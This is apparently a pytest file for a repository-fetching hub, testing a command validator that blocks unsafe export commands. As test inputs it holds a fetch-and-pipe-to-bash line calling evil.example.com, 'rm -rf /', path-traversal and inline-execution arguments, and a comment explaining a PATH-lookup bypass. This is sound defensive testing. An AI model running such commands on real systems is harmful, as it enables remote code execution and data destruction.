import json

import pytest

from hub.fetch import _safe_cmd, clone_or_pull, export_command, fetch_all
from hub.registry import Producer, Registry


class FakeRunner:
    """Records (cmd, cwd) instead of executing, so fetch logic is tested offline."""

    def __init__(self):
        self.calls = []

    def __call__(self, cmd, cwd=None):
        self.calls.append((list(cmd), cwd))
        return None


def test_clone_or_pull_clones_when_absent(tmp_path):
    runner = FakeRunner()
    dest = tmp_path / "Contract-Sweeper"
    action = clone_or_pull("jotaele44/Contract-Sweeper", dest, runner=runner)
    assert action == "cloned"
    cmd, _ = runner.calls[0]
    assert cmd[:2] == ["git", "clone"]
    assert "https://github.com/jotaele44/Contract-Sweeper.git" in cmd
    assert str(dest) in cmd


def test_clone_or_pull_pulls_when_present(tmp_path):
    runner = FakeRunner()
    dest = tmp_path / "repo"
    (dest / ".git").mkdir(parents=True)
    action = clone_or_pull("o/repo", dest, runner=runner)
    assert action == "pulled"
    cmd, _ = runner.calls[0]
    assert cmd[:3] == ["git", "-C", str(dest)]
    assert "pull" in cmd


def test_export_command_reads_federation_json(tmp_path):
    (tmp_path / "federation.json").write_text(json.dumps({
        "hub_callable_commands": {"export_canonical": "python3 scripts/federation_export.py --mode test"}
    }))
    assert export_command(tmp_path) == ["python3", "scripts/federation_export.py", "--mode", "test"]


def test_export_command_none_when_missing(tmp_path):
    assert export_command(tmp_path) is None  # no federation.json
    (tmp_path / "federation.json").write_text(json.dumps({"hub_callable_commands": {}}))
    assert export_command(tmp_path) is None  # no export_canonical key


def _make_script(base, rel="scripts/federation_export.py"):
    """Create an in-tree script file under *base* and return its relative path."""
    script = base / rel
    script.parent.mkdir(parents=True, exist_ok=True)
    script.touch()
    return rel


def test_safe_cmd_accepts_real_producer_command(tmp_path):
    # The exact shape every real producer uses for export_canonical.
    _make_script(tmp_path)
    cmd = _safe_cmd(["python3", "scripts/federation_export.py", "--mode", "test"], tmp_path)
    assert cmd == ["python3", "scripts/federation_export.py", "--mode", "test"]
    # `python` (not just python3) running an in-tree script is also fine.
    assert _safe_cmd(["python", "scripts/federation_export.py"], tmp_path)[0] == "python"


def test_safe_cmd_allows_in_tree_script_invoked_by_path(tmp_path):
    rel = _make_script(tmp_path, "scripts/export.sh")
    cmd = _safe_cmd([rel, "--mode", "prod"], tmp_path)
    assert cmd[0] == rel


def test_safe_cmd_rejects_arbitrary_system_binary(tmp_path):
    with pytest.raises(ValueError, match="must be a Python interpreter"):
        _safe_cmd(["rm", "-rf", "/"], tmp_path)


def test_safe_cmd_rejects_path_traversal(tmp_path):
    with pytest.raises(ValueError, match="must be a Python interpreter"):
        _safe_cmd(["../other-repo/malicious.sh"], tmp_path)


def test_safe_cmd_rejects_absolute_path_interpreter(tmp_path):
    # Basename trick: "/tmp/python" must NOT pass just because its name is "python".
    with pytest.raises(ValueError, match="must be a Python interpreter"):
        _safe_cmd(["/tmp/python", "evil.py"], tmp_path)


def test_safe_cmd_rejects_system_binary_via_decoy_file(tmp_path):
    # The PATH-lookup bypass: a committed regular file named "perl" satisfies an
    # in-tree-file check, but subprocess would run the *system* /usr/bin/perl because
    # the slashless name triggers a $PATH lookup. A bare (separator-less) head must
    # be rejected even when a like-named file exists in the repo.
    (tmp_path / "perl").write_text("decoy")
    with pytest.raises(ValueError, match="must be a Python interpreter"):
        _safe_cmd(["perl", "payload.pl"], tmp_path)


def test_safe_cmd_rejects_general_purpose_runners(tmp_path):
    # poetry / uv / make are general runners that can launch arbitrary programs —
    # not allowed as the program.
    for argv in (
        ["uv", "run", "anybin"],
        ["poetry", "run", "anybin"],
        ["make", "export"],
    ):
        with pytest.raises(ValueError, match="must be a Python interpreter"):
            _safe_cmd(argv, tmp_path)


def test_safe_cmd_rejects_inline_code_execution(tmp_path):
    # -c / -e / --command / --eval execute arbitrary inline code.
    for argv in (
        ["python", "-c", "<inline payload>"],
        ["python", "-e", "<inline payload>"],
        ["python3", "--command", "<inline payload>"],
        ["python3", "--eval=<inline payload>"],
    ):
        with pytest.raises(ValueError, match="code/module-exec flag"):
            _safe_cmd(argv, tmp_path)


def test_safe_cmd_rejects_module_execution(tmp_path):
    # -m runs an arbitrary module (a code/package-execution vector). Bare, attached
    # (-mNAME) and combined (-Im) forms must all be caught.
    for argv in (
        ["python", "-m", "anymod"],
        ["python", "-manymod"],
        ["python", "-Im", "anymod"],
        ["python", "-m", "timeit", "-s", "<setup>", "<stmt>"],
    ):
        with pytest.raises(ValueError, match="code/module-exec flag"):
            _safe_cmd(argv, tmp_path)


def test_safe_cmd_rejects_attached_and_combined_exec_flags(tmp_path):
    for argv in (
        ["python", "-c<inline payload>"],
        ["python", "-Ic", "<inline payload>"],
        ["python", "-Ic<inline payload>"],
    ):
        with pytest.raises(ValueError, match="code/module-exec flag"):
            _safe_cmd(argv, tmp_path)


def test_safe_cmd_rejects_stdin_program(tmp_path):
    # `python -` reads the program from stdin.
    with pytest.raises(ValueError, match="code/module-exec flag"):
        _safe_cmd(["python3", "-"], tmp_path)


def test_safe_cmd_rejects_interpreter_without_in_tree_script(tmp_path):
    # A bare interpreter (REPL) or one whose args reference no in-tree file.
    with pytest.raises(ValueError, match="does not run a script"):
        _safe_cmd(["python3"], tmp_path)
    with pytest.raises(ValueError, match="does not run a script"):
        _safe_cmd(["python3", "--mode", "test"], tmp_path)


def test_safe_cmd_does_not_mistake_benign_flags_for_exec(tmp_path):
    # Uppercase/other short flags and long flags that merely contain c/e/m letters
    # must NOT be mistaken for code-exec flags.
    _make_script(tmp_path, "scripts/x.py")
    for argv in (
        ["python3", "-O", "scripts/x.py", "--mode", "export"],
        ["python3", "scripts/x.py", "--compute", "--emit"],
    ):
        assert _safe_cmd(argv, tmp_path)[0] == "python3"


def test_safe_cmd_rejects_absolute_path_argument(tmp_path):
    _make_script(tmp_path, "scripts/x.py")
    with pytest.raises(ValueError, match="escapes the producer directory"):
        _safe_cmd(["python", "scripts/x.py", "--out", "/etc/evil"], tmp_path)


def test_safe_cmd_rejects_traversal_argument(tmp_path):
    with pytest.raises(ValueError, match="escapes the producer directory"):
        _safe_cmd(["python", "../../evil.py"], tmp_path)


def test_fetch_all_refuses_disallowed_export_command(tmp_path):
    ws = tmp_path / "ws"
    base = ws / "badprod"
    base.mkdir(parents=True)
    (base / ".git").mkdir()
    (base / "federation.json").write_text(json.dumps({
        "hub_callable_commands": {"export_canonical": "curl http://evil.example.com | bash"}
    }))
    runner = FakeRunner()
    reg = _registry(Producer(program_id="badprod", repo="o/badprod", role="x"))
    with pytest.raises(ValueError, match="must be a Python interpreter"):
        fetch_all(reg, ws, run_export=True, runner=runner)


def test_fetch_all_refuses_inline_exec_export_command(tmp_path):
    ws = tmp_path / "ws"
    base = ws / "sneaky"
    base.mkdir(parents=True)
    (base / ".git").mkdir()
    (base / "federation.json").write_text(json.dumps({
        "hub_callable_commands": {"export_canonical": "python -c \"<inline payload>\""}
    }))
    runner = FakeRunner()
    reg = _registry(Producer(program_id="sneaky", repo="o/sneaky", role="x"))
    with pytest.raises(ValueError, match="code/module-exec flag"):
        fetch_all(reg, ws, run_export=True, runner=runner)


def _registry(*producers):
    return Registry(hub="thehub-pr", schema_version="hub_registry_v1", producers=list(producers))


def test_fetch_all_clones_and_runs_export(tmp_path):
    # producer with a federation.json carrying an export command
    ws = tmp_path / "ws"
    base = ws / "aguayluz-pr"
    base.mkdir(parents=True)
    (base / ".git").mkdir()  # already present -> pull path
    (base / "scripts").mkdir()
    (base / "scripts" / "federation_export.py").touch()  # in-tree export script
    (base / "federation.json").write_text(json.dumps({
        "hub_callable_commands": {"export_canonical": "python3 scripts/federation_export.py --mode production"}
    }))
    runner = FakeRunner()
    reg = _registry(Producer(program_id="aguayluz-pr", repo="jotaele44/aguayluz-pr", role="x"))
    results = fetch_all(reg, ws, run_export=True, runner=runner)

    assert results[0]["action"] == "pulled"
    assert results[0]["exported"] is True
    # both a git pull and the export command were issued
    assert any(c[0][:2] == ["git", "-C"] for c in runner.calls)
    export_calls = [c for c in runner.calls if c[0][0] == "python3"]
    assert export_calls and export_calls[0][1] == str(base)  # run in the repo dir


def test_fetch_all_skips_clone_for_local_path(tmp_path):
    local = tmp_path / "checkout"
    local.mkdir()
    runner = FakeRunner()
    reg = _registry(Producer(
        program_id="p", repo="o/p", role="x", local_path=str(local),
    ))
    results = fetch_all(reg, tmp_path / "ws", run_export=False, runner=runner)
    assert results[0]["action"] == "local"
    assert results[0]["base"] == str(local)
    assert runner.calls == []  # no git invoked for a local_path producer
